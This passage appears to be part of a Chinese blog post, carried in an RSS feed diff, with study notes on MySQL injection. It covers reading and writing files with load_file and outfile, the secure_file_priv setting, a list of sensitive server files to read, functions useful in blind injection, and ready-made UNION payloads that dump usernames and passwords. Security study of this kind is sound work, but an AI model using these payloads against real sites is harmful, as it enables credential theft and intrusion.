punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;d:/test1.txt&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;+---------------------------+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; a&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;aaaa&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;               &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;+---------------------------+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; row &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0.00&lt;/span&gt; sec&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;mysql&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;a&lt;span class=&#34;token entity&#34; title=&#34;\n&#34;&gt;\n&lt;/span&gt;aa&lt;span class=&#34;token entity&#34; title=&#34;\r&#34;&gt;\r&lt;/span&gt;aaaa&#39;&lt;/span&gt; into dumpfile &lt;span class=&#34;token string&#34;&gt;&#39;d:/test.txt&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Query OK, &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; row affected &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0.00&lt;/span&gt; sec&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;mysql&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; load_file&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;d:/test.txt&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    -&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;+--------------------------+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; load_file&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;d:/test.txt&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;+--------------------------+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; a&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;aaaa                &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;+--------------------------+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; row &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0.00&lt;/span&gt; sec&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;有一个需要关注的点就是：outfile 后面不能接 0x 开头或者 char 转换以后的路径，只能是单引号路径。这个问题在 php 注入中更加麻烦，因为会自动将单引号转义成 &#39;, 那么基本就 GG 了，但是 load_file，后面的路径可以是单引号、0x、char 转换的字符，但是路径中的斜杠是 / 而不是 \&lt;/p&gt;
+&lt;h3 id=&#34;mysql新特性secure_file_priv对读写文件的影响&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mysql新特性secure_file_priv对读写文件的影响&#34;&gt;#&lt;/a&gt; MYSQL 新特性 secure_file_priv 对读写文件的影响&lt;/h3&gt;
+&lt;p&gt;secure-file-priv 特性&lt;br /&gt;
+ secure-file-priv 参数是用来限制 LOAD DATA, SELECT ... OUTFILE, and LOAD_FILE () 传到哪个指定目录的。&lt;/p&gt;
+&lt;font color=&#34;red&#34;&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;secure_file_priv 的值为 null ，表示限制 mysqld 不允许导入 | 导出&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入 | 导出只能发生在 /tmp/ 目录下&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入 | 导出做限制&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/font&gt;
+&lt;p&gt;如何查看 secure-file-priv 参数的值：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;show global variables like &#39;%secure%&#39;;&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;+--------------------------+------+
+| Variable_name            | Value|
++--------------------------+------+
+| require_secure_transport | OFF  |
+| secure_auth              | ON   |
+| secure_file_priv         | NULL |
++--------------------------+------+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;修改 secure_file_priv 的值:&lt;br /&gt;
+windows 下：修改 my.ini 在 [mysqld] 内加入 secure_file_priv =&lt;br /&gt;
+linux 下：修改 my.cnf 在 [mysqld] 内加入 secure_file_priv =&lt;br /&gt;
+ 然后重启 mysql，再查询 secure_file_priv&lt;/p&gt;
+&lt;h3 id=&#34;load_file-常用路径&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#load_file-常用路径&#34;&gt;#&lt;/a&gt; load_file () 常用路径：&lt;/h3&gt;
+&lt;p&gt;1、 replace(load_file(0×2F6574632F706173737764),0×3c,0×20)&lt;br /&gt;
+2、replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))&lt;/p&gt;
+&lt;p&gt;上面两个是查看一个 PHP 文件里完全显示代码。有些时候不替换一些字符，如 “&amp;lt;” 替换成” 空格” 返回的是网页。而无法查看到代码.&lt;/p&gt;
+&lt;p&gt;3、 load_file (char (47)) 可以列出 FreeBSD,Sunos 系统根目录&lt;br /&gt;
+ 4、/etc tpd/conf tpd.conf 或 /usr/local/apche/conf tpd.conf 查看 linux APACHE 虚拟主机配置文件&lt;br /&gt;
+ 5、c:\Program Files\Apache Group\Apache\conf \httpd.conf 或 C:\apache\conf \httpd.conf 查看 WINDOWS 系统 apache 文件&lt;br /&gt;
+ 6、c:/Resin-3.0.14/conf/resin.conf 查看 jsp 开发的网站 resin 文件配置信息.&lt;br /&gt;
+7、c:/Resin/conf/resin.conf/usr/local/resin/conf/resin.conf 查看 linux 系统配置的 JSP 虚拟主机&lt;br /&gt;
+ 8、d:\APACHE\Apache2\conf\httpd.conf&lt;br /&gt;
+9、C:\Program Files\mysql\my.ini&lt;br /&gt;
+10、…/themes/darkblue_orange/layout.inc.php phpmyadmin 爆路径&lt;br /&gt;
+ 11、 c:\windows\system32\inetsrv\MetaBase.xml 查看 IIS 的虚拟主机配置文件&lt;br /&gt;
+ 12、 /usr/local/resin-3.0.22/conf/resin.conf 针对 3.0.22 的 RESIN 配置文件查看&lt;br /&gt;
+ 13、 /usr/local/resin-pro-3.0.22/conf/resin.conf 同上&lt;br /&gt;
+ 14 、/usr/local/app/apache2/conf/extra tpd-vhosts.conf APASHE 虚拟主机查看&lt;br /&gt;
+ 15、 /etc/sysconfig/iptables 本看防火墙策略&lt;br /&gt;
+ 16 、 usr/local/app/php5 b/php.ini PHP 的相当设置&lt;br /&gt;
+ 17 、/etc/my.cnf MYSQL 的配置文件&lt;br /&gt;
+ 18、 /etc/redhat-release 红帽子的系统版本&lt;br /&gt;
+ 19 、C:\mysql\data\mysql\user.MYD 存在 MYSQL 系统中的用户密码&lt;br /&gt;
+ 20、/etc/sysconfig/network-scripts/ifcfg-eth0 查看 IP.&lt;br /&gt;
+21、/usr/local/app/php5 b/php.ini//PHP 相关设置&lt;br /&gt;
+ 22、/usr/local/app/apache2/conf/extra tpd-vhosts.conf// 虚拟网站设置&lt;br /&gt;
+ 23、C:\Program Files\&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL1JoaW5vU29mdC5jb20=&#34;&gt;RhinoSoft.com&lt;/span&gt;\Serv-U\ServUDaemon.ini&lt;br /&gt;
+24、c:\windows\my.ini&lt;br /&gt;
+25、c:\boot.ini&lt;/p&gt;
+&lt;h2 id=&#34;网站常用配置文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#网站常用配置文件&#34;&gt;#&lt;/a&gt; 网站常用配置文件&lt;/h2&gt;
+&lt;p&gt;config.inc.php、config.php。&lt;/p&gt;
+&lt;p&gt;load_file（）时要用 replace（load_file (HEX)，char (60),char (32)）&lt;br /&gt;
+注：&lt;br /&gt;
+Char (60) 表示 &amp;lt;&lt;br /&gt;
+Char（32）表示 空格&lt;/p&gt;
+&lt;h2 id=&#34;手工注射时出现的问题&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#手工注射时出现的问题&#34;&gt;#&lt;/a&gt; 手工注射时出现的问题：&lt;/h2&gt;
+&lt;p&gt;当注射后页面显示：&lt;br /&gt;
+Illegal mix of collations (latin1_swedish_ci,IMPLICIT) and (utf8_general_ci,IMPLICIT) for operation ‘UNION’&lt;br /&gt;
+如：/instrument.php?ID=13 and 1=2 union select 1,load_file (0x433A5C626F6F742E696E69),3,4,user ()&lt;br /&gt;
+ 这是由于前后编码不一致造成的，&lt;br /&gt;
+解决方法：在参数前加上 unhex (hex (参数)) 就可以了。上面的 URL 就可以改为：&lt;br /&gt;
+/instrument.php?ID=13 and 1=2 union select 1,unhex(hex(load_file(0x433A5C626F6F742E696E69))),3,4,unhex(hex(user()))&lt;/p&gt;
+&lt;h1 id=&#34;常见函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见函数&#34;&gt;#&lt;/a&gt; 常见函数&lt;/h1&gt;
+&lt;font color=&#34;DeepSkyBlue&#34;&gt;
+&lt;h2 id=&#34;length&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#length&#34;&gt;#&lt;/a&gt; length()&lt;/h2&gt;
+&lt;p&gt;MySQL LENGTH (str) 函数的返回值为字符串的字节长度，使用 uft8（UNICODE 的一种变长字符编码，又称万国码）编码字符集时，一个汉字是 3 个字节，一个数字或字母是一个字节。&lt;/p&gt;
+&lt;p&gt;【实例】使用 LENGTH 函数计算字符串长度，输入的 SQL 语句和执行结果如下所示。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; SELECT LENGTH(&#39;name&#39;),LENGTH(&#39;数据库&#39;);
++----------------+---------------------+
+|LENGTH(&#39;name&#39;)  | LENGTH(&#39;数据库&#39;)    |
++----------------+---------------------+
+|              4 |                   9 |
++----------------+---------------------+
+1 row in set (0.04 sec)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;由运行结果可以看到，一个汉字是 3 个字节，“数据库” 字符串占 9 个字节。英文字符的个数和所占的字节相同，一个字符占 1 个字节。&lt;/p&gt;
+&lt;h2 id=&#34;substr&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#substr&#34;&gt;#&lt;/a&gt; substr()&lt;/h2&gt;
+&lt;p&gt;mysql substr () 函数&lt;br /&gt;
+截取字符串&lt;/p&gt;
+&lt;p&gt;用法：substr (string string,num start,num length);&lt;/p&gt;
+&lt;p&gt;select  substr (参数 1，参数 2，参数 3)  from  表名&lt;br /&gt;
+ string 为字符串；start 为起始位置；length 为长度。&lt;/p&gt;
+&lt;p&gt;注意：mysql 中的 start 是从 1 开始的。&lt;/p&gt;
+&lt;p&gt;SUBSTR () 函数是 SUBSTRING () 函数的同义词，所以可以互换使用它们&lt;/p&gt;
+&lt;h2 id=&#34;sleep&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sleep&#34;&gt;#&lt;/a&gt; sleep()&lt;/h2&gt;
+&lt;h2 id=&#34;benchmark&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#benchmark&#34;&gt;#&lt;/a&gt; benchmark()&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;
+BENCHMARK(count,expr)   
+BENCHMARK()函数重复countTimes次执行表达式expr，它可以用于计时MySQL处理表达式有多快。结果值总是0。意欲用于mysql客户，它报告查询的执行时间。   
+mysql&amp;gt; select BENCHMARK(1000000,encode(&amp;quot;hello&amp;quot;,&amp;quot;goodbye&amp;quot;));   
++----------------------------------------------+   
+| BENCHMARK(1000000,encode(&amp;quot;hello&amp;quot;,&amp;quot;goodbye&amp;quot;)) |   
++----------------------------------------------+   
+| 0                                            |   
++----------------------------------------------+   
+1 row in set (4.74 sec)  
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;ifexpr1expr2expr3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ifexpr1expr2expr3&#34;&gt;#&lt;/a&gt; if(expr1,expr2,expr3)&lt;/h2&gt;
+&lt;p&gt;if(length(database())&amp;gt;5,sleep(5),1)&lt;/p&gt;
+&lt;h2 id=&#34;datadir&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#datadir&#34;&gt;#&lt;/a&gt; @@datadir&lt;/h2&gt;
+&lt;p&gt;数据库文件所在位置&lt;/p&gt;
+&lt;h2 id=&#34;version_compile_os&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#version_compile_os&#34;&gt;#&lt;/a&gt; @@version_compile_os&lt;/h2&gt;
+&lt;p&gt;查看当前操作系统&lt;/p&gt;
+&lt;h2 id=&#34;concat&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#concat&#34;&gt;#&lt;/a&gt; concat()&lt;/h2&gt;
+&lt;p&gt;语法及使用特点：&lt;br /&gt;
+CONCAT(str1,str2,…)&lt;br /&gt;
+ 返回结果为连接参数产生的字符串。如有任何一个参数为 NULL ，则返回值为 NULL。可以有一个或多个参数。&lt;/p&gt;
+&lt;h2 id=&#34;concat_ws&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#concat_ws&#34;&gt;#&lt;/a&gt; concat_ws()&lt;/h2&gt;
+&lt;p&gt;使用函数 CONCAT_WS（）。使用语法为：CONCAT_WS (separator,str1,str2,…)&lt;br /&gt;
+ CONCAT_WS () 代表 CONCAT With Separator ，是 CONCAT () 的特殊形式。第一个参数是其它参数的分隔符。分&lt;br /&gt;
+隔符的位置放在要连接的两个字符串之间。分隔符可以是一个字符串，也可以是其它参数。如果分隔符为 NULL，&lt;br /&gt;
+则结果为 NULL。函数会忽略任何分隔符参数后的 NULL 值。但是 CONCAT_WS () 不会忽略任何空字符串。 (然而会&lt;br /&gt;
+忽略所有的 NULL）。&lt;br /&gt;
+如 SELECT CONCAT_WS (&#39;_&#39;,id,name) AS con_ws FROM info LIMIT 1; 返回结果为&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;+----------+
+| con_ws   |
++----------+
+| 1_BioCyc |
++----------+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;group_concat&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#group_concat&#34;&gt;#&lt;/a&gt; group_concat()&lt;/h2&gt;
+&lt;p&gt;区分 concat_ws () 与 group_concat () 函数&lt;br /&gt;
+ concat_ws (char (32,58,32),user (),database (),version ())&lt;br /&gt;
+ 在 concat_ws 函数中，第一个参数是用于作为分隔符将后面各个参数的内容分隔开来再进行相应的连接产生新的字符串。&lt;/p&gt;
+&lt;p&gt;group_connect () 函数&lt;br /&gt;
+完整的语法如下：&lt;br /&gt;
+group_concat ([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator ‘分隔符’])&lt;br /&gt;
+ 功能：将 group by 产生的同一个分组中的值连接起来，返回一个字符串结果&lt;br /&gt;
+说明：通过使用 distinct 可以排除重复值；如果希望对结果中的值进行排序，可以使用 order by 子句；separator 是一个字符串值，缺省为一个逗号。&lt;/p&gt;
+&lt;p&gt;图一，区别&lt;br /&gt;
+&lt;img data-src=&#34;image001.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;报错注入&lt;br /&gt;
+ 0x7e  ASCII    ~&lt;/p&gt;
+&lt;p&gt;updatexml () 是更新 xml 文档的函数&lt;/p&gt;
+&lt;p&gt;语法 updatexml (目标 xml 文档，xml 路径，更新的内容)&lt;br /&gt;
+&lt;img data-src=&#34;image002.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;php&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#php&#34;&gt;#&lt;/a&gt; php&lt;/h2&gt;
+&lt;h3 id=&#34;preg_math&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#preg_math&#34;&gt;#&lt;/a&gt; preg_math()&lt;/h3&gt;
+&lt;h3 id=&#34;floor&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#floor&#34;&gt;#&lt;/a&gt; floor()&lt;/h3&gt;
+&lt;p&gt;语法&lt;br /&gt;
+ floor (x)&lt;br /&gt;
+ 返回不大于 x 的下一个整数，将 x 的小数部分舍去取整。floor () 返回的类型仍然是 float，因为 float 值的范围通常比 integer 要大。&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;floor&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0.60&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;floor&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0.40&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;floor&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;floor&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5.1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;floor&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5.1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;floor&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5.9&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;//输出：&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;0&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;0&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;5&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;5&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;-6&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;-6&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;html 实体编码&lt;/p&gt;
+&lt;/font&gt;
+&lt;h1 id=&#34;sql-injection-payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql-injection-payload&#34;&gt;#&lt;/a&gt; SQL injection payload&lt;/h1&gt;
+&lt;p&gt;用户名 密码&lt;br /&gt;
+数字型&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;?id=-1 union select 1,(select group_concat(concat_ws(&amp;quot;--&amp;gt;&amp;quot;,username,password) separator &#39;&amp;lt;br&amp;gt;&#39;) from users),(@@datadir)&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;字段名&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;?id=-1 union select 1,2,(select group_concat(column_name separator &#39;&amp;lt;br&amp;gt;&#39;) from information_schema.columns where table_name=&#39;users&#39;)&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;表名&lt;br /&gt;
+ &lt;code&gt;?id=-1 union select 1,(select group_concat(table_name separator &#39;&amp;lt;br&amp;gt;&#39;) from information_schema.tables where table_schema=database()),3&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;单引号括号&lt;br /&gt;
+ &lt;code&gt;?id=-1&#39;) union select 1,(select group_concat(concat_ws(&amp;quot;--&amp;gt;&amp;quot;,username,password) separator &#39;&amp;lt;br&amp;gt;&#39;) from users),3 --+&lt;/code&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+    </channel>
+</rss>
